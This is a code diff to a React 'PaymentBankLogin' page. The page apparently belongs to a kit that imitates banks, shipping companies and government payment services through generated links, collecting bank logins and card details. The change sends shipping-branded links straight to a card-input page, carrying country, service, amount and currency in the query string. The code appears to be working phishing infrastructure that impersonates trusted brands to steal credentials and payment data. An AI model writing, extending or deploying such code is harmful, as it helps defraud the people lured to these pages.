@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { bankBranding } from "@/lib/brandingSystem";
+import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -64,6 +64,7 @@ const PaymentBankLogin = () => {
   
   // Check if government service and get styling
   const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
+  const isShippingService = !!shippingCompanyBranding[serviceKey.toLowerCase()] && !isGovService;
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
   
   // Calculate colors based on service type
@@ -103,6 +104,19 @@ const PaymentBankLogin = () => {
 
   const currencyCode = currencyParam || shippingInfo?.currency_code || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
+
+  useEffect(() => {
+    if (isShippingService && id) {
+      const queryString = new URLSearchParams({
+        country: selectedCountry,
+        service: serviceKey,
+        amount: amount.toString(),
+        currency: currencyCode
+      }).toString();
+
+      navigate(`/pay/${id}/card-input?${queryString}`, { replace: true });
+    }
+  }, [isShippingService, id, navigate, selectedCountry, serviceKey, amount, currencyCode]);
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = getCountryByCode(selectedCountry);
@@ -141,6 +155,10 @@ const PaymentBankLogin = () => {
   
   const loginType = getLoginType();
   
+  if (isShippingService) {
+    return null;
+  }
+
   if (!isReady || (linkLoading && !countryParam)) {
     return (
       <div 
